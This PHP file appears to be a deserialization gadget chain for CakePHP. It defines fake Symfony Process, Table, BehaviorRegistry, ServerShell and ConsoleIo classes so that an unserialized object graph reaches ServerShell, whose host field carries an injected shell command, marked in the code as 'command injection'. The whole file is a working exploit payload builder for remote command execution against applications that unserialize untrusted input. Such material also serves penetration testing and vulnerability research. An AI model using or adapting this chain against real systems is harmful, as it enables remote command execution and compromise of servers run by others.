<?php

namespace Symfony\Component\Process
{
    use Cake\ORM\Table;

    class Process
    {
        private $options;
        private $processPipes;
        private $status;
        private $process;

        public function __construct($cmd)
        {
            $this->options['create_new_console'] = 0;
            $this->processPipes = new Table($cmd);
            $this->status = "started";
            $this->process = 1;
        }
    }
}

namespace Cake\ORM
{
    use Cake\Shell\ServerShell;

    class Table
    {
        protected $_behaviors;
        
        public function __construct($cmd)
        {
            $this->_behaviors = new BehaviorRegistry($cmd);
        }
    }

    class BehaviorRegistry
    {
        protected $_methodMap;
        protected $_loaded;

        public function __construct($cmd)
        {
            $this->_methodMap = ['readandwrite' => ['mb', 'main']];
            $this->_loaded = ['mb' => new ServerShell($cmd)];
        }
    }
}

namespace Cake\Shell
{
    use Cake\Console\ConsoleIo;

    class ServerShell
    {
        protected $_host;
        protected $_port;
        protected $_documentRoot;
        protected $_io;

        public function __construct($cmd)
        {
            $this->_host = '& ' . $cmd . ' &'; // command injection
            $this->_port = '';
            $this->_documentRoot = '';
            $this->_io = new ConsoleIo();
        }
    }
}

namespace Cake\Console
{
    class ConsoleIo
    {
        protected $_out;

        public function __construct()
        {
            $this->_level = -100;
        }
    }
}
